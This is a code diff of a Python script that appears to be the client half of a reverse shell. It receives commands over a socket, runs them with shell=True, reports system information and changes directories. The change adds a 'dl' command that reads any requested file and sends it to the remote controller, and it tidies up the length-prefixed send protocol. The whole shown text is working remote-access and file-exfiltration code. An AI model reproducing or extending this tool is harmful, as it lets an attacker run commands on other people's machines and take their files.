@@ -30,37 +30,40 @@ while True:
     if not command_data:
         break
     command = command_data.decode()
-    print(f"Command : ", command)
+    print(f"Command : {command}")
 
     command_split = command.split(" ")
 
     if command == "infos":
         response = platform.platform() + " " + os.getcwd()
+        response = response.encode()
     elif len(command_split) == 2 and command_split[0] == "cd":
         try:
             os.chdir(command_split[1].strip("'"))
             response = " "
         except FileNotFoundError:
             response = "Error: No such file or directory"
+        response = response.encode()
+    elif len(command_split) == 2 and command_split[0] == "dl":
+        try:
+            file = open(command_split[1], "rb")
+        except FileNotFoundError:
+            response = " ".encode()
+        else:
+            response = file.read()
+            file.close()
     else:
         result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
         response = result.stdout + result.stderr
-
         if not response or len(response) == 0:
-            response = ""
+            response = " "
+        response = response.encode()
 
-    # HEADER 13 octets -> length octet
-    # DATA (length) octets
-
-    # HEADER 0000003173
-    # DATA 3173 octets
-    data_len = len(response.encode())
-    header = str(len(response.encode())).zfill(13)
+    data_len = len(response)
+    header = str(data_len).zfill(13)
     print(f"Header {header}")
     s.sendall(header.encode())
     if data_len > 0:
-        s.sendall(response.encode())
-
-    # Hanshake
+        s.sendall(response)
 
 s.close()
